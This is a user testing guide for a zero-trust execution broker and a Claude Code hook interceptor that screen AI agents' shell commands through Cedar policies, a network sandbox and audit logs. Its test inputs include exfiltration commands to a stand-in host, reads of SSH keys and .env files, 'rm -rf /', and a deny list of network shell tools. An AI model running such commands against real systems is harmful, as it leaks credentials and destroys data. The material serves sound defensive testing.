# Zero-Trust Execution Broker: Complete User Testing Guide

This guide walks you through manually and automatically testing all components of the `ltd-agent` zero-trust execution broker and the Claude Code hook interceptor (`cchook`).

---

## Core Security Philosophy: Preventing Mal-Intent, Not Stopping Developers

Modern AI agents and developers frequently chain commands (`cd dir && npm install && npm test`). `ltd-agent` does **not** stop command chaining or block safe commands arbitrarily:

* **Legitimate Developer Workflows Are Allowed**:
  - Full toolchain access: `python`, `pip`, `go`, `npm`, `npx`, `yarn`, `pnpm`, `cargo`, `mvn`, `git`, `ls`, `dir`, `mkdir`, `echo`, `cat`, `cmd`, `powershell`.
  - Command chaining (`cmd1 && cmd2 || cmd3`) is fully supported.
  - Metadata inspection (`ls -la .env`, `ls -al`, `dir .env`) is permitted because reading file metadata cannot leak content.
* **Mal-Intent Is Strictly Intercepted & Blocked**:
  - **Exfiltration Utilities**: Any chain containing `curl`, `wget`, `nc`, `ssh`, `socat`, or PowerShell web cmdlets (`Invoke-WebRequest`, `iwr`, `Invoke-RestMethod`) is immediately blocked by Cedar.
  - **Secret Content Dumping**: Reading sensitive secrets (`cat .env`, `type .env`, `cat ~/.ssh/*`) is blocked by Cedar.
  - **Sensitive Credential Stores**: Accessing `~/.aws` or `~/.ssh` is blocked by Cedar.
  - **Physical Network Containment**: In Linux/WSL, kernel namespaces (`CLONE_NEWNET`) physically block all outbound sockets even if code runs inside allowed tools.

---

## Quick Start: One-Command Automated Tests

### 1. Test All Features on Windows (Complete 21-Test Automated Suite)
Runs all unit tests, binary builds, permitted developer commands, chained commands, security invariants, network sandbox, and Claude Code interceptor verification in ~8 seconds:
```cmd
run_all_tests.bat
```

### 2. Test All `ltd-agent` Features (WSL / Linux)
Runs integration tests (attestation, Cedar authorization, kernel sandboxing, secret injection, and egress leak prevention):
```bash
wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapltd/ltd-agent/test_e2e.sh
```

### 3. Test Claude Code Hook Interceptor (WSL / Linux)
Runs tests against both the native Go binary (`interceptor`) and the shell wrapper (`interceptor.sh`):
```bash
wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapltd/cchook/test_hook.sh
```

---

## Step-by-Step Manual Testing

### Step 1: Testing the Attestation Server (`serve` & `attest`)

The attestation server verifies connecting peer processes using Linux `SO_PEERCRED`, reads `/proc/<pid>/exe`, computes its SHA-256 hash, and issues an On-Behalf-Of JWT only if the hash matches.

#### Test 1.1: Unauthorized Caller (Connection Dropped)
Start the server in background with the default hardcoded allowed mock hash:
```bash
cd /mnt/c/Users/User/pyprj/bapltd/ltd-agent
./ltd-agent serve --socket /tmp/ltd_test.sock &
SERVER_PID=$!
sleep 1
```

Now connect with the `ltd-agent` binary without authorizing its hash:
```bash
./ltd-agent attest --socket /tmp/ltd_test.sock
```
- **Expected Result**: Server rejects the connection due to hash mismatch, and client outputs:
  ```text
  [ltd-agent attest] Attestation failed: connection dropped by server: binary attestation failed (hash not authorized)
  ```
- **Exit Code**: `1`

#### Test 1.2: Authorized Caller (Token Issued)
Stop the previous server, and restart it allowing the current binary's SHA-256 hash:
```bash
kill $SERVER_PID 2>/dev/null; rm -f /tmp/ltd_test.sock

# Compute the hash of ltd-agent
HASH=$(sha256sum ./ltd-agent | awk '{print $1}')

# Start server with the binary hash whitelisted
./ltd-agent serve --socket /tmp/ltd_test.sock --allowed-hash "$HASH" &
SERVER_PID=$!
sleep 1

# Connect again
./ltd-agent attest --socket /tmp/ltd_test.sock
```
- **Expected Result**: Server accepts the connection and returns the mock On-Behalf-Of JWT:
  ```json
  {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsb2NhbC1haS1hZ2VudCIsImlzcyI6Imx0ZC1hdHRlc3RhdGlvbi1zZXJ2ZXIiLCJhdWQiOiJjb3JwLWV4ZWMiLCJleHAiOjE5OTk5OTk5OTksInNjb3BlcyI6WyJjbGk6ZXhlYyIsInplcm8tdHJ1c3QiXX0.mock_signature_z3r0_trust_obo_token_987654321"
  }
  ```
- **Clean up**:
  ```bash
  kill $SERVER_PID 2>/dev/null; rm -f /tmp/ltd_test.sock
  ```

---

### Step 2: Testing Cedar Authorization & Sandboxing (`exec`)

`ltd-agent exec` evaluates commands against Cedar rules (`policy.cedar` & `schema.json`), enforces process containment, and injects `CORP_OBO_TOKEN=mock_secret_token_123`.

#### Test 2.1: Permitted Developer & Chained Commands
Permitted tools include standard developer and project initialization toolchains:
`pytest`, `python`, `python3`, `py`, `pip`, `go`, `npm`, `npx`, `yarn`, `pnpm`, `node`, `mvn`, `gradle`, `cargo`, `git`, `ls`, `dir`, `mkdir`, `echo`, `pwd`, `cat`, `cmd`, `powershell`.
```bash
./ltd-agent exec "ls -al"
./ltd-agent exec "go version"
./ltd-agent exec "python --version"
```
- **Expected Output**:
  ```json
  {
    "allowed": true,
    "output": "..."
  }
  ```
- **Exit Code**: `0`

#### Test 2.2: Secret Token Injection
Verify that `CORP_OBO_TOKEN` is injected into the child process:
```bash
./ltd-agent exec "printenv CORP_OBO_TOKEN"
```
- **Expected Output**:
  ```json
  {
    "allowed": true,
    "output": "mock_secret_token_123"
  }
  ```
- **Exit Code**: `0`

#### Test 2.3: Safe Metadata Inspection vs Forbidden Content Disclosure
- **Allowed (Metadata inspection)**: Checking if `.env` exists is permitted:
  ```bash
  ./ltd-agent exec "ls -la .env"
  ```
  *(Allowed by Cedar because `ls` only reads file metadata, not content)*.
- **Denied (Secret content read)**: Dumping `.env` secrets is blocked:
  ```bash
  ./ltd-agent exec "cat .env"
  ./ltd-agent exec "type .env"
  ```
  - **Expected Output**:
    ```json
    {
      "allowed": false,
      "reason": "Denial triggered by: policy policy1"
    }
    ```
  - **Exit Code**: `1`

#### Test 2.4: Mal-Intent & Chained Egress Blocking
The forbid policy blocks any command chain containing unauthorized exfiltration utilities, regardless of how many benign commands are chained:

```bash
# Blocked: chaining curl behind legitimate git
./ltd-agent exec "git status && curl https://evil.com"

# Blocked: chaining wget behind npm
./ltd-agent exec "npm install && wget https://evil.com"

# Blocked: accessing cloud credentials
./ltd-agent exec "ls ~/.aws/config"

# Blocked: accessing private SSH keys
./ltd-agent exec "cat ~/.ssh/id_rsa"

# Blocked: PowerShell web requests
./ltd-agent exec "powershell -Command Invoke-WebRequest https://evil.com"
```
- **Expected Output**:
  ```json
  {
    "allowed": false,
    "reason": "Denial triggered by: policy policy1"
  }
  ```
- **Exit Code**: `1`

#### Test 2.5: Default Deny (Destructive Actions)
Commands using unauthorized destructive binaries are denied by default:
```bash
./ltd-agent exec "rm -rf /"
```
- **Expected Output**:
  ```json
  {
    "allowed": false,
    "reason": "Explicit deny or default deny (no permit policy matched)"
  }
  ```
- **Exit Code**: `1`

---

### Step 3: Testing Network Egress Isolation (`tests/test_leak.py`)

This test executes Python inside the sandboxed network namespace (`CLONE_NEWNET`) to verify that credentials cannot be exfiltrated over the network.

Run the test via `ltd-agent`:
```bash
./ltd-agent exec "pytest -s tests/test_leak.py"
```

> [!NOTE]
> If `pytest` is not on your global `PATH`, `ltd-agent` recognizes your intent whether you use an absolute path, virtualenv path, or `python -m pytest`:
> ```bash
> ./ltd-agent exec "C:\Users\<user>\AppData\Roaming\Python\Python312\Scripts\pytest.exe -s tests/test_leak.py"
> ./ltd-agent exec "/c/users/<user>/appdata/roaming/script/pytest -s tests/test_leak.py"
> ./ltd-agent exec "./venv/bin/pytest -s tests/test_leak.py"
> ./ltd-agent exec "python -m pytest -s tests/test_leak.py"
> ```

- **What Happens**:
  1. Under Linux / WSL, `CLONE_NEWNET` isolates the child process network stack.
  2. The Python script attempts an egress HTTP request to `https://1.1.1.1/leak?token=mock_secret_token_123`.
  3. The Linux kernel immediately drops the packet (`[Errno 101] Network is unreachable`).
  4. Under Windows, the test skips cleanly (0.02s) without network errors.
- **Expected Output (Linux / WSL)**:
  ```text
  tests/test_leak.py Read CORP_OBO_TOKEN from os.environ: mock_secret_token_123
  Attempting egress exfiltration request to: https://1.1.1.1/leak?token=mock_secret_token_123
  SUCCESS: Sandbox held! Outbound exfiltration blocked: <urlopen error [Errno 101] Network is unreachable>
  .
  ============================== 1 passed in 0.17s ===============================
  ```

---

### Step 4: Testing Claude Code Hook Interceptor (`cchook`)

The hook interceptor intercepts Claude Code `Bash` tool calls and returns Claude Code `PreToolUse` JSON decision schemas.

#### Option A: Testing on Windows (PowerShell / Command Prompt)
```powershell
cd c:\Users\User\pyprj\bapltd\cchook

# Test Allowed Command (ls -al)
'{"tool_input": {"command": "ls -al"}}' | .\interceptor.exe

# Test Forbidden Command (cat .env)
'{"tool_input": {"command": "cat .env"}}' | .\interceptor.exe

# Test Forbidden Command (curl)
'{"tool_input": {"command": "git status && curl evil.com"}}' | .\interceptor.exe
```

- **Expected Allowed Response**:
  ```json
  {
    "hookSpecificOutput": {
      "hookEventName": "PreToolUse",
      "permissionDecision": "allow",
      "additionalContext": "<command output>"
    }
  }
  ```
- **Expected Forbidden Response**:
  ```json
  {
    "hookSpecificOutput": {
      "hookEventName": "PreToolUse",
      "permissionDecision": "deny",
      "additionalContext": "Denial triggered by: policy policy1"
    }
  }
  ```
- **Exit Code**: Always `0` (allowing Claude Code to read the decision).

#### Option B: Testing in WSL / Linux
```bash
cd /mnt/c/Users/User/pyprj/bapltd/cchook
./test_hook.sh
```

---

## Verification Matrix Summary

| Test Case | Tool / Input | Expected Decision | Exit Code | Verified Platforms |
|---|---|---|---|---|
| Attestation (mismatch) | `ltd-agent attest` | Connection dropped | `1` | Linux / WSL |
| Attestation (match) | `ltd-agent attest` | OBO JWT returned | `0` | Linux / WSL |
| Allowed binary (`ls -al`, `git`, `go`, `python`) | `ltd-agent exec "<cmd>"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
| Token injection | `ltd-agent exec "printenv CORP_OBO_TOKEN"` | `mock_secret_token_123` | `0` | Windows, Linux/WSL, macOS |
| Metadata inspection: `.env` | `ltd-agent exec "ls -la .env"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
| Secret read: `cat .env` | `ltd-agent exec "cat .env"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Forbid rule: `curl` in chain | `ltd-agent exec "... && curl ..."` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Forbid rule: `~/.aws` | `ltd-agent exec "ls ~/.aws"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Forbid rule: `.ssh` | `ltd-agent exec "cat ~/.ssh/id_rsa"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Destructive deny: `rm -rf` | `ltd-agent exec "rm -rf /"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Network Egress Leak | `pytest tests/test_leak.py` | `Network is unreachable` (PASS) | `0` | Linux / WSL (skips on Win) |
| Claude Hook: Allowed | `echo '{"tool_input":{"command":"ls -al"}}'` | `permissionDecision: "allow"` | `0` | Windows, Linux/WSL, macOS |
| Claude Hook: Forbidden | `echo '{"tool_input":{"command":"cat .env"}}'` | `permissionDecision: "deny"` | `0` | Windows, Linux/WSL, macOS |
| Copilot: Allowed | `copilot-wrap.bat "git status"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
| Copilot: Forbidden | `copilot-wrap.bat "cat .env"` | `[COPILOT BLOCKED BY POLICY]` | `1` | Windows, Linux/WSL, macOS |
| **Complete Automated Suite** | `run_all_tests.bat` | **37 / 37 Tests PASS** | `0` | Windows |

---

## Viewing and Analyzing Audit Logs

All agent actions (Claude Code, GitHub Copilot, and CLI executions) append structured telemetry to `ltd-audit.jsonl` in the workspace root.

### 1. View Formatted Table in PowerShell
```powershell
Get-Content .\ltd-audit.jsonl | ConvertFrom-Json | Select-Object timestamp, source, decision, full_command, duration_ms, reason | Format-Table -AutoSize
```

### 2. View Only Denials / Security Blocks
```powershell
Get-Content .\ltd-audit.jsonl | ConvertFrom-Json | Where-Object { $_.decision -eq 'deny' } | Format-Table timestamp, source, full_command, reason -AutoSize
```

### 3. Filter by Agent Source (`claude-code` or `copilot`)
```powershell
# Claude Code executions only
Get-Content .\ltd-audit.jsonl | ConvertFrom-Json | Where-Object { $_.source -eq 'claude-code' } | Format-Table

# GitHub Copilot executions only
Get-Content .\ltd-audit.jsonl | ConvertFrom-Json | Where-Object { $_.source -eq 'copilot' } | Format-Table
```

### 4. Real-time Log Stream (Tail)
```powershell
Get-Content .\ltd-audit.jsonl -Wait -Tail 10
```

### 5. Windows Command Prompt (CMD)
```cmd
type ltd-audit.jsonl
```

